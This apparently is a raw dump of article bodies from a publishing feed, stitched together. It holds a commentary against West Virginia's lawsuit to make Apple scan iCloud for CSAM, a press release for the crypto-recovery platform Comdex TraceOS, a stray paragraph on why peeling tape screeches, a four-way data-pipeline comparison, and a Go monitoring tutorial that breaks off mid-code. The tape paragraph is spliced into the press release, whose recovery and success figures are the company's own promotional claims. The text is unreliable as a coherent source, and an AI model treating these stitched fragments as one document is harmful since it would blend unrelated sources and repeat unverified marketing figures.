particularly hard case to make.</p><p>This is not a novel concern that McCuskey can plausibly claim he didn’t know about. As Pfefferkorn noted:</p><blockquote><p><em>As <a href=\"https://cyber.fsi.stanford.edu/io/news/cybertipline-report\"></a> (based on interviews with dozens of people) describes, all the stakeholders involved in combating online CSAM – tech companies, law enforcement, prosecutors, NCMEC, etc. – are excruciatingly aware of the “government agent” dilemma, and they all take great care to stay very far away from potentially crossing that constitutional line. Everyone scrupulously preserves the voluntary, independent nature of online platforms’ decisions about whether and how to search for CSAM.&nbsp;</em></p></blockquote><p>There is a reason Congress, when it enacted the federal statute requiring providers to  CSAM when they  it, explicitly included a disclaimer that providers cannot be forced to  it. The statute was deliberately written this way. Congress understood the constitutional trap.</p><p>This careful architecture matters. The people actually working to protect children from CSAM—prosecutors, investigators, NCMEC analysts, trust and safety professionals—have spent years building a legally sound framework where platforms voluntarily detect and report this material in ways that preserve prosecutorial viability. That framework depends entirely on the voluntariness of the detection. McCuskey’s lawsuit would bulldoze it.</p><p>Pfefferkorn put it bluntly about the earlier private lawsuit:</p><blockquote><p><a href=\"https://www.americanbar.org/groups/professional_responsibility/publications/model_rules_of_professional_conduct/rule_1_1_competence/\"></a><em>plaintiff’s counsel should have figured this out before filing a lawsuit asking a federal court to make Apple start scanning iCloud for CSAM, thereby making Apple a government agent, thereby turning the compelled iCloud scans into unconstitutional searches, thereby making it likelier for any iCloud user who gets caught to walk free, thereby shooting themselves in the foot, doing a disservice to their client, making the situation worse than the status quo, and causing a major setback in the fight for child safety online.</em></p></blockquote><p>That was written about private plaintiff’s attorneys making this mistake. Here we have an Attorney General—representing the State of West Virginia, invoking the state’s “parens patriae” authority over children—making the exact same mistake, only this time with the full weight of the government behind it. When the government compels a search, the state agent doctrine doesn’t just  apply. It almost certainly does. By definition.</p><p>The complaint makes much of Apple’s short-lived NeuralHash project, announced in August 2021 and quietly shelved by December 2022. The press release from McCuskey’s office frames Apple’s abandonment of NeuralHash as evidence of bad faith—the company caved to “a vocal minority of purported privacy advocates,” in the complaint’s framing, choosing brand value over child safety.</p><p>What the complaint skips over is why the security community reacted so strongly to NeuralHash in the first place. <a href=\"https://www.techdirt.com/2021/09/03/apple-recognizes-it-jumped-too-quickly-csam-detection-system-delays-implementation/\">We covered it at the time</a>: the core objection from security researchers wasn’t that detecting CSAM is bad. It was that you  build client-side scanning infrastructure that only scans for CSAM. Once you build the pipe, you have built the pipe.</p><p>The same mechanism Apple would use to match photos against an NCMEC hash database could be used—by Apple, under government compulsion, or by adversarial actors who compromise the system—to scan for political speech, religious content, or anything else a government wants to find. The EFF called it “a backdoor to increased surveillance and censorship around the world.” WhatsApp called it “a surveillance system that could very easily be used to scan private content for anything they or a government decides it wants to control.”</p><p>Apple’s own director of user privacy and child safety, Erik Neuenschwander, wrote in <a href=\"https://www.sec.gov/files/corpfin/no-action/14a-8/afaapple102124-14a8inc.pdf\">a letter explaining</a> how dangerous the company’s scanning plan was:</p><blockquote><p><em>Scanning every user’s privately stored iCloud content would in our estimation pose serious unintended consequences for our users. Threats to user data are undeniably growing – globally the total number of data breaches more than tripled between 2013 and 2021, exposing 1.1 billion personal records in 2021 alone. As threats become increasingly sophisticated, we are committed to providing our users with the best data security in the world, and we constantly identify and mitigate emerging threats to users’ personal data, on device and in the cloud.</em><strong><em>Scanning every user’s privately stored iCloud data would create new threat vectors for data thieves to find and exploit.</em></strong></p><p><em>It would also inject the potential for a slippery slope of unintended consequences. Scanning for one type of content, for instance, opens the door for bulk surveillance and could create a desire to search other encrypted messaging systems across content types (such as images, videos, text, or audio) and content categories. How can users be assured that a tool for one type of surveillance has not been reconfigured to surveil for other content such as political activity or religious persecution? Tools of mass surveillance have widespread negative implications for freedom of speech and, by extension, democracy as a whole. Also, designing this technology for one government could require applications for other countries across new data types.</em></p><p><em>Scanning systems are also not foolproof and there is documented evidence from other platforms that</em><strong><em>innocent parties have been swept into dystopian dragnets that have made them victims when they have done nothing more than share perfectly normal and appropriate pictures of their babies</em></strong></p></blockquote><p>McCuskey’s complaint calls these representations “false and/or misleading” because they contradict Apple’s earlier reassurances that NeuralHash was narrowly tailored. But those security concerns are real regardless of how Apple marketed the tool—and the fact that Apple made optimistic promises about NeuralHash in 2021 doesn’t mean the subsequent concerns that emerged were wrong.</p><p>The complaint’s treatment of encryption more broadly is where the legal theory becomes genuinely dangerous, not just to this case, but to security infrastructure generally. Count I—strict liability for design defect—alleges that by choosing to implement end-to-end encryption and  build surveillance capabilities into iCloud, Apple has defectively designed its product.</p><p>Think through what that means if it succeeds. Any company offering customers strong encryption becomes potentially liable for design defects unless it simultaneously builds government-accessible backdoors. Signal is a defective product. ProtonMail is a defective product. Any messaging app that doesn’t scan your conversations for the government is a defective product.</p><p>That’s not a narrow CSAM-specific argument. That’s a declaration that encryption itself is a tortious product choice—an existential threat to the security tools that protect journalists, activists, abuse survivors, and yes, children themselves. Security experts have been fighting <a href=\"https://www.techdirt.com/2023/10/18/professor-whos-always-been-wrong-about-csam-detection-once-again-says-its-super-easy-to-detect-csam/\">this exact framing</a> for decades, and here it is appearing in a West Virginia circuit court complaint dressed up as consumer protection law.</p><p>The consumer protection angle is also worth noting. The complaint argues that Apple’s privacy policy constitutes a material misrepresentation that misled West Virginia consumers. But look at what <a href=\"https://www.apple.com/legal/privacy/en-ww/\">Apple’s policy</a> actually says. It doesn’t promise comprehensive CSAM scanning. It lists circumstances under which Apple “may” access personal data, including the ability to “prescreen or scan uploaded content for potentially illegal content, including child sexual exploitation material.”</p><p>That’s disclosure of a capability, not a promise of comprehensive deployment—a CYA for what Apple might do, not a commitment to what it will do. McCuskey’s complaint pretends Apple promised universal scanning. No one reading the actual policy in good faith could reach that conclusion.</p><p>But even setting aside the misrepresentation of Apple’s policy language, the AG’s remedy gives the game away. He doesn’t just want Apple to clarify its privacy disclosures. He wants Apple to actually implement the scanning he claims the policy promised. Which brings us right back to the Fourth Amendment trap. The remedy is what makes this lawsuit dangerous.</p><p>There is something else worth noting about how this lawsuit was filed. The signature block on the complaint lists not only the West Virginia AG’s office but also outside private counsel—Troy N. Giatras and Matthew Stonestreet of The Giatras Law Firm—appointed as “Special Assistant Attorneys General.”</p><p>This arrangement is common in mass tort litigation: private lawyers sometimes pitch state AGs on filing suits that might generate large settlements, then take a cut when they do. Nothing about that is necessarily improper. But it does invite the question of whether the legal theory here was pressure-tested for constitutional viability or pressure-tested for settlement potential.</p><p>Here’s the cynical read: maybe no one involved actually expects this to go to judgment. Big Tech company + horrific subject matter + “first-of-its-kind” headline = a strong opening bid in a negotiation. If the goal is litigation pressure to extract voluntary changes from Apple—or just a settlement check—the Fourth Amendment analysis is irrelevant to the AG’s actual strategy. Apple pays something, McCuskey declares victory, gets his headlines, and everyone moves on.</p><p>But that calculation requires Apple to fold. And if Apple doesn’t—if this actually proceeds to the remedy stage—the constitutional trap springs shut on every subsequent prosecution. Apple should also recognize that folding here just invites 49 other AGs to file copycat suits demanding the same thing.</p><p>Did no one in West Virginia consider that  this lawsuit was a “first of its kind” is because <em>everyone who actually knows what they’re doing knows this lawsuit would do real damage</em>? As Pfefferkorn noted in her original piece for us in the summer of 2024 regarding the private class action lawsuit:</p><blockquote><p><em>The reason nobody’s filed a lawsuit like this against Apple to date, despite years of complaints from left, right, and center about Apple’s ostensibly lackadaisical approach to CSAM detection in iCloud, isn’t because nobody’s thought of it before. It’s because they thought of it</em><strong><em>and they did their fucking legal research first</em></strong><em>. And then they backed away slowly from the computer, grateful to have narrowly avoided turning themselves into useful idiots for pedophiles. But now these lawyers have apparently decided to volunteer as tribute. If their gambit backfires, they’ll be the ones responsible for the consequences.</em></p></blockquote><p>If the goal is actually to protect children, the path forward involves working with platforms on voluntary detection improvements, adequately funding NCMEC, prosecuting offenders whose crimes come to light through existing reporting mechanisms, and addressing the genuinely hard policy questions around encryption without destroying Fourth Amendment protections that also protect, among other people, children.</p><p>What the goal does not involve—cannot involve, under current constitutional law—is a state AG filing a headline-grabbing lawsuit to force mass warrantless surveillance of private cloud storage. That’s not child protection. That’s political theater with catastrophic potential consequences for the actual prosecution of the people the AG claims to be after.</p><p>McCuskey got his press conference and his headline. What he has not done is help any child in West Virginia. The only people who stand to benefit from his success are the predators whose prosecutions will collapse when the evidence gets thrown out.</p>",

      "content": "<p>Harlow, Essex, United Kingdom — 25 February 2026 — <a href=\"https://www.comdexdataservices.com\">Comdex Data Services Limited</a> has announced the launch of <a href=\"https://www.comdexdataservices.com\">Comdex TraceOS™</a>, its proprietary blockchain intelligence platform designed to trace cryptocurrency fund flows, assess risk signals, support fraud prevention workflows, and accelerate recovery work for retail scam victims in the United States.</p><p>The launch comes as US agencies continue to warn about the scale and growth of crypto-enabled fraud. The FBI describes cryptocurrency investment fraud, commonly referred to as “pig butchering,” as one of the most prevalent and damaging fraud schemes.&nbsp; </p><p>FinCEN has also issued an alert highlighting “pig butchering” as a prominent virtual currency investment scam and outlining indicators for identifying related activity.&nbsp; The US Secret Service has published a public advisory describing “pig butchering” scam methods and prevention guidance.&nbsp; Separately, the FTC reported that investment scams generated the highest reported losses of any fraud category in 2024.&nbsp;</p><p>The system is designed to support investigations across major cryptocurrencies and networks, including widely used assets such as Bitcoin (BTC), Ethereum (ETH) and Solana (SOL), as well as token ecosystems frequently associated with newer scam typologies. The platform is operated by Comdex investigators and is not offered as a consumer-facing product.</p><p>Comdex said the platform consolidates several investigation and recovery workflows in one system. These include wallet clustering and attribution, fund-flow tracing across wallets and services, automated risk scoring, cross-chain tracing through swaps and bridges, scam pattern detection, and case-ready forensic reporting intended to support engagement with exchanges and law enforcement.</p><p>Comdex said its services are focused on assisting retail victims of crypto loss linked to common fraud patterns. These include romance and “pig butchering” scams, fake trading platforms and fraudulent exchanges, impersonation of customer support, airdrop and giveaway scams, phishing and wallet drains, SIM swap attacks, rug pulls and exit scams that target people after an initial loss. The FBI’s IC3 has also warned that fraudsters often initiate contact through social media or dating applications and use fictitious returns to encourage additional deposits.&nbsp;</p><p>Comdex said the platform <a href=\"https://www.comdexdataservices.com\">supports asset tracing and recovery activity</a>, including cross-border coordination where required, and is designed to speed up identification of on-chain routes to service providers and exchanges. The company said it aims to reduce time-to-action by using AI-enabled scanning to trace funds to exchange and service touchpoints more quickly.</p><p>Comdex said it has handled thousands of cases over approximately 11 years of crypto-related recovery work, including partial and full recoveries. The company said it has recovered more than $150 million using third-party software and external tooling, and that it began building its own technology in 2023 based on its casework experience to improve tracing speed, risk detection, and recovery execution. Comdex reports an 89.4% success rate on a <a href=\"https://www.comdexdataservices.com\">no-win, no-fee basis</a>, supported by <a href=\"https://www.comdexdataservices.com\">internal reporting and independent audit</a> activity.</p><p>Looking ahead, Comdex said it estimates that it could support recoveries totaling upwards of $450 million by 2035, driven by AI-enabled scanning across blockchains and faster tracing to exchanges and other on-ramps and off-ramps. Comdex also said it plans to explore post-quantum approaches over the next two decades as part of its long-term research and development roadmap, with the goal of strengthening resilience against future cyber-enabled fraud.</p><p>Comdex said its operating model is designed to take complexity out of recovery for victims, using structured intake, evidence handling, and clear case updates during time-sensitive tracing and preservation windows.</p><p>Comdex Data Services Limited is a UK private limited company incorporated on 10 December 1997 (company number 03478499) with a registered office at 18 New Horizon Business Centre, Barrows Road, Harlow, Essex, CM19 5FN.&nbsp; Comdex provides crypto tracing and recovery support for retail scam victims using its proprietary blockchain intelligence capabilities, including Comdex TraceOS™.</p><p>:::tip\nThis story was published as a press release by Btcwire under HackerNoon’s Business Blogging&nbsp;</p><p>This article is for informational purposes only and does not constitute investment advice.

The team's earlier work, in 2010, had identified a sequence of transverse cracks racing across the width of the adhesive during peeling, and a 2024 follow-up established a direct correspondence between those cracks and the screeching sound, but neither study pinpointed a mechanism. \n\nThe new findings show that a partial vacuum forms between the tape and the surface as each crack opens, and because the crack moves faster than air can rush in to fill the void, the vacuum travels along until it reaches the tape's edge and collapses into the stationary air outside, producing a discrete sound pulse.",

      "content": "<p><em>dbt, Airflow, Spark, and plain SQL walked into a bar. Only one of them didn't cause an incident at 2 am.</em></p><p>It started with a straightforward ask.</p><p>Our analytics team needed a daily pipeline: pull raw event data from S3, clean it, join it against a customer dimension table, aggregate it into a revenue summary, and land it in the warehouse by 7 am so the business had numbers for their morning standup.</p><p>Simple enough. Except I had four strong opinions in my head and a rare window of time where I could actually test them properly.</p><p>So instead of picking one approach and moving on, I built the same pipeline four times. Same source data. Same business logic. Same destination. Different tools, different architectures, different everything else.</p><p>Three months later, I have opinions I didn't have before. Some of them surprised me.</p><p>Every data team I've worked with has the same unspoken war going on: the engineers want Spark, the analytics engineers want dbt, the data scientists want Airflow DAGs they can control themselves, and somewhere a senior engineer has a 3,000-line SQL file they wrote in 2019 that nobody is allowed to touch because it somehow still works.</p><p>These debates are usually settled by whoever speaks loudest in the architecture meeting, not by evidence. I wanted evidence.</p><p>Here's what the logic actually needed to do:</p><p>Read raw clickstream events from S3 (JSON, roughly 40 million rows per day, schema drifts occasionally). Deduplicate events, since the same event_id can appear multiple times due to at-least-once delivery. Filter to only revenue-generating event types. Join against a slowly-changing customer dimension table (Type 2 SCD). Aggregate to daily revenue per customer segment. Write the result to a warehouse table with incremental logic so we're not reprocessing everything every day.</p><p>Nothing exotic. Exactly the kind of pipeline that exists in thousands of companies right now.</p><p>I'll be honest. I almost didn't include this one. It felt too old-fashioned to take seriously.</p><p>I was wrong to feel that way.</p><p>The SQL version took the least time to write. The business logic was completely transparent. Anyone who could read SQL could follow it. The deduplication was a ROW<em>NUMBER() window function. The SCD join was a date-bound BETWEEN. The incremental logic was a WHERE event</em>date = CURRENT_DATE - 1.</p><p>It ran in 4 minutes in our warehouse. Costs almost nothing. When it breaks, the error message tells you exactly which line failed.</p><p>What went wrong: schema drift broke it on day 11. A new event type arrived with a field that had a different data type than expected, and the pipeline failed silently. It completed successfully. It just dropped those rows. I didn't know for two days. There was no alerting, no data quality check, no contract enforcement. Just missing revenue numbers that everyone assumed were a business dip.</p><p>That was the lesson. SQL is not the problem. The lack of structure around SQL is the problem. When something goes wrong, you're debugging alone with SELECT * and a prayer.</p><p>Would I use it again? For stable, well-understood pipelines with strong testing upstream, yes. For anything touching raw external data, absolutely not without wrapping it in something with validation and observability.</p><h2>Attempt 2: Apache Airflow</h2><p>Airflow felt like the responsible adult choice. Scheduling, retries, dependencies, a UI you can actually look at. What's not to like?</p><p>Building the DAG took longer than I expected. Not because Airflow is hard, but because I kept running into the gap between the Python that orchestrates the work and the Python that does the work. Airflow is an orchestrator, not an execution engine. That's the right design, but it meant my actual transformation logic lived in a jumble of SQL strings embedded in Python operators, and that combination is harder to test than either pure SQL or pure Python would be.</p><p>The SCD in particular got ugly. Expressing slowly-changing dimension logic in a way that's both correct and readable inside a PythonOperator is an exercise in patience.</p><p>What actually worked: the observability was genuinely excellent. When the S3 read failed on day 6 because of a permissions issue, I had an email in my inbox before I'd finished my coffee. The retry logic handled two transient failures automatically. The audit trail told me exactly when each task ran, how long it took, and what the inputs were.</p><p>What went wrong: dependency management became a burden fast. The Airflow environment needed specific package versions, and two of those packages conflicted with each other in ways that took an entire afternoon to diagnose. And the DAG code became hard to read quickly. By the end, it was 380 lines of Python to express logic that took 90 lines of SQL.</p><p>Also, testing Airflow DAGs locally is a genuinely miserable experience. I spent more time fighting the local environment than writing business logic.</p><p>Would I use it again? Yes, but as pure orchestration, calling out to dbt or a separate transformation layer. Never again as the place where transformation logic lives.</p><p>Spark is the one who impresses people in interviews. It's also the one that humbled me the most.</p><p>The PySpark code was actually elegant. Dataframe operations for deduplication, a broadcast join for the customer dimension since that table fits in memory, wand indowing functions for the SCD logic. When it worked, it was fast and expressive.</p><p>For 40 million rows a day, Spark is overkill. I knew this going in. But I wanted to understand the real cost of that overkill, not just assume it.</p><p>The real cost: cluster startup time added 4 to 6 minutes to every run before a single row was processed. My SQL version ran in 4 minutes total. The Spark version ran in 3 minutes of actual processing plus 5 minutes of cluster initialization. So it was \"faster\" in the wrong way.</p><p>The operational overhead was the bigger problem. Spark has opinions about memory management that it enforces aggressively and explains poorly. I hit an out-of-memory error on day 8 during a backfill run, and diagnosing it required reading Spark executor logs in a UI that feels like it was designed to discourage you.</p><p>What actually worked: the schema enforcement was excellent. I defined a schema explicitly, and when the drift event hit on day 11, the same one that silently broke the SQL version, Spark threw an error immediately and loudly. Nothing got silently dropped.</p><p>Would I use it again? For this use case, no. For data at 10x or 100x this volume, or for complex transformations that a SQL engine can't express cleanly, yes. Spark earns its complexity at scale. At 40 million rows, it's a sports car you're using to drive to the grocery store.</p><p>I'll admit my bias upfront. I came into this expecting dbt to win. I was not entirely right, and the ways I was wrong were instructive.</p><p>The dbt version felt the most like software engineering. Models are files. Files are version-controlled. Tests are declarative. The documentation is generated automatically. When I wrote the revenue aggregation model, I could see exactly which upstream models it depended on, and dbt would refuse to run it if those models hadn't succeeded first.</p><p>The SCD join was clean. dbt's snapshot feature handles Type 2 SCDs with a configuration block, no manual date-bounding required. The incremental model logic was readable and explicit. The deduplication was a simple macro.</p><p>What actually worked: the governance story was the best of any approach. Column-level descriptions, source freshness alerts, test coverage on every model, and a lineage graph I could show to a non-technical stakeholder. When the schema drift hit, a dbt test caught it before the model ran.</p><p>What went wrong: dbt is opinionated and sometimes its opinions fought mine. Incremental logic that seems simple in concept has edge cases that the is_incremental() macro handles in ways that aren't always obvious. I hit a subtle issue where late-arriving events from the previous day weren't being reprocessed correctly and debugging it required understanding dbt internals I hadn't needed to know before.</p><p>The other thing: dbt runs SQL. It does not run Python. For anything that genuinely needs Python, complex ML feature engineering, calling external APIs mid-pipeline, you're reaching for dbt-python models or pushing that logic elsewhere. That boundary trips people up.</p><p>Would I use it again? Yes, and it's now my default for analytical pipelines in a warehouse environment. But I'd pair it with an orchestrator for scheduling and alerting, and I'd be honest with my team that dbt's learning curve is real and the documentation, while good, assumes you already think a certain way about data modeling.</p><p>|    | Build Time | Debuggability | Schema Safety | Operational Overhead | Governance |\n|----|----|----|----|----|----|\n| Plain SQL | Fast | Low | None | Very Low | None |\n| Airflow | Slow | High | Low | High | Low |\n| Spark | Medium | Low | High | Very High | Low |\n| dbt | Medium | Medium | High | Medium | High |</p><p>Never embed transformation logic inside an Airflow DAG. Airflow is an orchestrator. Treat it like one. The moment your SQL lives inside a Python string inside an operator, you've created something harder to test than SQL and harder to debug than Python. Keep orchestration and transformation separate.</p><p>Never use Spark below a certain data volume threshold without justifying it in writing. Not because Spark is bad, but because the operational tax is real and it compounds. Every new team member needs to learn it. Every environment needs to support it. Every incident takes longer to diagnose. That's fine if you're processing petabytes. It's a waste if you're not.</p><p>Never deploy plain SQL against raw external data without schema contracts. SQL is fast to write and easy to read. It is not self-defending. One upstream schema change and you're flying blind. If you're going to use SQL, pair it with something that enforces contracts and makes failures loud.</p><p>Never pick a tool based on what's impressive. Spark impresses people. It impressed me in the demo phase. But the right tool is the one your team can operate, debug, and extend at 2 am when something breaks, and the business is waiting on numbers. Boring infrastructure is underrated.</p><p>The pipeline wasn't the hard part. It never is.</p><p>The hard part is what happens after the pipeline runs. Is the data trustworthy? Would you know if it wasn't? Can someone else on your team understand what it's doing? Can you audit it when the business asks why a number changed?</p><p>None of the four approaches nailed all of that on their own. The one that came closest was dbt, not because it's magic, but because it's designed around the assumption that data pipelines exist in organizations and organizations need documentation, testing, and lineage more than they need raw speed.</p><p>Three months of building the same thing four ways taught me less about tools than I expected and more about what questions to ask before picking one.</p><p>Start with: what does \"this broke\" look like at 2 am, and who's going to fix it?</p><p>The answer tells you everything about which tool you should choose.</p>",

      "content": "<p>At the early stage, most startups skip observability entirely — it's too expensive or too complex for a tiny VPS. But flying blind slows down every product decision and turns every incident into a guessing game. Here's how I fit a complete monitoring stack into just 1 GB of RAM.</p><p>I'm a Go developer at a major BigTech company and a co-founder of <a href=\"https://t.me/BLIJE_aibot\">Blije</a>, an AI-powered relationship advisor. Basically, it's a Telegram bot that receives a user's question via the long-polling model, adds a prompt to it, sends it to an LLM, receives a response, and sends it back to the user. Conversation context and user data are stored in PostgreSQL. There is a single Go application instance, plus a cron job that sends notifications asking users for product feedback. Docker Compose orchestrates the multi-container setup.</p><p>My team also includes a product manager responsible for product development. He needs to quickly test ideas, see which channels work, and track engagement and retention — all at minimal cost.</p><p>For deployment, I chose a free VPS on <a href=\"https://cloud.ru\">cloud.ru</a>, the Free Tier plan (this is not an ad, you can pick any provider and VPS you like). 4 GB of RAM and 30 GB of disk space are enough to test the hypothesis.</p><p>| Service | memreservation |\n|----|----|----|\n| PostgreSQL | 1200 MB | 800 MB |\n| Bot | 512 MB | 256 MB |\n| Cron | 128 MB | 64 MB |\n| Total (application) |  |  |</p><p>\\\nOut of the 4 GB, almost 2 GB are already used by the application, plus the operating system and Docker overhead. The whole monitoring stack has to fit into what is left.</p><h3>The Need for Observability</h3><p>The first inconvenience is that during deployment I often have to check the logs. To do this, I connect to the server via SSH and check the logs.</p><pre><code># -f — follow mode. Without it, the command prints current logs and exits\n# --tail 50 — limits initial output to the last 50 lines\n# bot — shows logs only for the bot container\ndocker compose logs -f --tail 50 bot\n</code></pre><p>\\\nThe second issue is that the product manager constantly needs data on new users. For example, how many users who registered today sent one message, two or more messages, or five or more messages. To get this, I need to run a database query, which is neither convenient nor fast.</p><pre><code>SELECT                                                                                          \n      msg_count,                              -- number of messages                             \n      COUNT(*) AS users_count                 -- how many users sent that many messages\n  FROM (                                                                                          \n      SELECT                                                                                      \n          u.id,                               -- user ID                                  \n          COUNT(m.id) AS msg_count            -- count each user's messages\n      FROM users u                                                                                \n      JOIN messages m                         -- join with the messages table\n          ON m.user_id = u.id                 -- by user ID\n          AND m.role = 1                      -- only user messages (not bot responses)\n      WHERE u.created_at &gt;= CURRENT_DATE      -- user registered today\n        AND u.created_at &lt; CURRENT_DATE + INTERVAL '1 day'  -- until end of today\n      GROUP BY u.id                           -- group by user\n  ) sub                                       -- subquery: each user + their message count\n  GROUP BY msg_count                          -- group by message count\n  ORDER BY msg_count;                         -- sort ascending\n</code></pre><p>\\\nAdditionally, we needed metrics for:</p><ul><li>How many users pressed the start button (new users), with support for dynamic labels (payload after start)</li><li>How many users completed onboarding and sent their first message (active users)</li><li>Users who returned on the n-th day after registration (retention)</li></ul><p>We wanted all of this to be available through a simple, user‑friendly interface with dashboards, so the product manager could check the data he needs on his own. I also needed a fast way to see service issues — error counts and LLM response times. All of this had to be done quickly, by myself, within the 2 GB RAM limit.</p><h3>The Three Pillars of Observability</h3><p>If you've read \"\" by Sam Newman or \"\" by Chris Richardson, you're familiar with the three pillars of observability: metrics, logs, and traces.  Traces are necessary when a request passes through a chain of microservices. They allow you to see how much time the request spends in each service and make optimization decisions. In my case, it's a single application instance and a database. Therefore, I decided not to use tracing.</p><p>\\\nThat leaves two pillars: logs and metrics.</p><p>I compared tools based on popularity, ease of integration, and most importantly RAM usage was the main constraint and the deciding factor.</p><p>| Tool | GitHub Stars | Min. RAM | Purpose |\n|----|----|----|----|\n| Elasticsearch | 76k | 1–2 GB | Full-text search, indexes entire log contents |\n| Loki | 27.6k | 128–256 MB | Stores logs, indexes only labels (not content) |</p><p>\\\n<a href=\"https://github.com/elastic/elasticsearch\">Elasticsearch</a> is a popular tool for enterprise solutions that indexes every word in every log entry. However, its RAM usage is above our limits because full‑text indexing is very resource‑intensive.</p><p><a href=\"https://github.com/grafana/loki\">Loki</a>, developed by Grafana Labs, was introduced in 2018 as \"Prometheus for logs.\" Loki's core idea is to make logging as cheap and operationally simple as possible by giving up on building a full search index for the text inside log lines.</p><p>| Tool | GitHub Stars | Min. RAM | Purpose |\n|----|----|----|----|\n| PostgreSQL (event table) | — | 0 MB (already deployed) | Write events to a table; Grafana supports PostgreSQL as a datasource |\n| ClickHouse | 45.7k | 1–2 GB | Column-based OLAP database for analytics |\n| Prometheus | 62.6k | 256–512 MB | Pull model, stores time-series data, native Go client library |\n| VictoriaMetrics | 16.3k | 128–256 MB | Prometheus-compatible, more RAM-efficient |</p><p>\\\n<a href=\"https://github.com/ClickHouse/ClickHouse\">ClickHouse</a> is a columnar database designed for analytics. It excels at fast aggregations and is well-suited for event data. However, its minimum RAM usage starts at 1 GB, closer to 2 GB in practice. It also requires significant time for setup and integration. It is more of an enterprise analytics solution, but overkill for a single service.</p><p><a href=\"https://github.com/prometheus/prometheus\">Prometheus</a> has a native Go client library. It uses a pull model: it scrapes metrics from applications on its own (no need to configure push logic in your code). It is straightforward to set up and integrate. There is a lot of tutorials available online. It has an enormous ecosystem: thousands of ready-made Grafana dashboards and exporters for any database or service. The downsides are poor horizontal scalability and no built-in long-term storage. Currently, we only need metrics for the recent 30-day window, and our user base is too small to worry about scalability.</p><p><a href=\"https://github.com/VictoriaMetrics/VictoriaMetrics\">VictoriaMetrics</a> is an excellent Prometheus-compatible alternative that is even more memory-efficient. However, Prometheus is already the de facto standard; documentation and Go examples are built around it, and the 100–200 MB difference is not critical.</p><p>Another option is to store metrics directly in PostgreSQL by creating an events table. Grafana supports PostgreSQL as a datasource out of the box. This could have been a good place to start, but making a separate table and writing migrations takes more time. Moreover, PostgreSQL performs best with a 70–80% read / 20–30% write ratio; here the situation is reversed.</p><p>Grafana integrates with all the systems listed above. A single UI for everything. Additionally, dashboards can be stored in the repository alongside the code. It uses 128–256 MB of RAM.</p><p>| Component | Tool | RAM () | Role |\n|----|----|----|----|\n| Metrics | Prometheus | 512 MB | Metrics collection and storage |\n| Logs | Loki | 256 MB | Log storage |\n| Log collector | Promtail | 64 MB | Reads Docker logs and ships them to Loki (standard for Loki) |\n| Visualization | Grafana | 256 MB | Dashboards for metrics and logs |</p><p>\\\nThe whole monitoring stack is about 1 GB. Together with the application (1.8 GB), the total is about 2.8 GB out of 4 GB. This leaves enough free memory for the OS and Docker.</p><p>\\\n The application writes logs to stdout. Promtail reads stdout/stderr of all project containers via the Docker socket and pushes them to Loki. Loki saves the logs to disk.</p><p> The application provides an HTTP endpoint at . Every 10 seconds, Prometheus scrapes the current metric values. The advantage of the pull model is that the application does not depend on Prometheus. If the  monitoring system stops working, the application keeps running normally.</p><p> Grafana is connected to both Prometheus and Loki — a single UI with two data sources.</p><p>What needs to change in the service itself so that it starts producing logs and exposing metrics.</p><p>The first thing Loki needs is structured logs in JSON format. JSON format turns each log line into a record that can be easily filtered, indexed, and analyzed programmatically.</p><p>Starting with Go 1.21, the standard library includes , which supports structured logging. A clear benefit: no outside tools or libraries are needed.</p><p>Logger initialization looks like this:</p><pre><code>// cmd/service/main.go\n\nlogHandler := slog.NewJSONHandler(os.Stdout, &amp;slog.HandlerOptions{\n    Level: slog.LevelInfo,\n})\nlogger := slog.New(logHandler).With(\"service\", \"bot\")\n</code></pre><p>\\\n sets the minimum logging level. This means only logs at the  level and above will be written to stdout. Every log record will automatically have  so you can filter logs by application. For example, cron will have .</p><p>Here is an example of a log call and what it prints to the console:</p><pre><code>logger.Info(\"bot started successfully\")\n</code></pre><pre><code>{\n  \"time\":\"2026-02-03T14:29:10.080Z\",\n  \"level\":\"INFO\",\n  \"msg\":\"bot started successfully\",\n  \"service\":\"bot\"\n}\n</code></pre><h3>HTTP Endpoint for Prometheus</h3><p>Prometheus operates on a pull model. It visits an endpoint and collects metrics by itself. We need to start an HTTP server that provides metrics at the  path.</p><pre><code>// cmd/service/main.go\n\nimport \"github.com/prometheus/client_golang/prometheus/promhttp\"\n\nmetricsServer := &amp;http.Server{Addr: \":9091\", Handler: promhttp.Handler()}\ngo func() {\n    logger.Info(\"starting metrics server\", \"addr\", \":9091\")\n    if err := metricsServer.ListenAndServe(); err != nil &amp;&amp; !errors.Is(err, http.ErrServerClosed) {\n        logger.Error(\"metrics server error\", \"error\", err)\n    }\n}()\n</code></pre><p>\\\nThe server listens on port  in a separate goroutine, so it does not block the main application thread.  is a built-in handler that returns all registered metrics in the format that Prometheus expects.</p><p>We also add a graceful shutdown for the metrics server. If Prometheus tries to collect metrics after the server has already stopped during a container shutdown, errors will show up in the logs.</p><pre><code>// cmd/service/main.go — within the graceful shutdown block\n\n&lt;-ctx.Done()\nlogger.Info(\"shutdown signal received, starting graceful shutdown\")\n\n// Stop the bot\nlogger.Info(\"stopping telegram bot\")\nb.Stop()\n\n// Stop the metrics server\nlogger.Info(\"stopping metrics server\")\nmetricsCtx, metricsCancel := context.WithTimeout(context.Background(), 5*time.Second)\ndefer metricsCancel()\nif err := metricsServer.Shutdown(metricsCtx); err != nil {\n    logger.Error(\"failed to shutdown metrics server\", \"err\", err)\n}\n\n// Close the database connection pool\nlogger.Info(\"closing database connection\")\npgConn.Close()\n</code></pre><p>\\\nThe bot stops first so that no new messages come in. The metrics server stops last, giving Prometheus enough time to collect the final values.</p><p>To send events, we use . It is a Prometheus helper that automatically adds metrics when they are created. Below is a closer look at the metric types we use.</p><p><strong>Counter (an Event Occurred)</strong></p><p> is the simplest type. It increases monotonically. Ideal for counting events.</p><pre><code>// internal/pkg/metrics/metrics.go\n\n// New users — simple counter\nNewUsersTotal = promauto.NewCounter(\n    prometheus.CounterOpts{\n        Name: \"new_users_total\",\n        Help: \"Total number of newly registered users\",\n    },\n)\n\n// Successfully sent review notifications\nReviewSentTotal = promauto.NewCounter(\n    prometheus.CounterOpts{\n        Name: \"review_sent_total\",\n        Help: \"Total number of successfully sent review notifications\",\n    },\n)\n</code></pre><p>\\\nWhen registering a new user:</p><pre><code>// internal/app/usecase/start_chat.go\n\nuser = &amp;models.User{\n    ID:        request.UserID,\n    CreatedAt: time.Now(),\n}\nmetrics.NewUsersTotal.Inc()  // +1 to the counter\n</code></pre><p>\\\nIn Prometheus, you can now query by the  metric.</p><p><strong>CounterVec (Event + Category)</strong></p><p> is the same counter but with labels. It lets you split events into categories.</p><pre><code>// internal/pkg/metrics/metrics.go\n\n// /start commands by source — where the user came 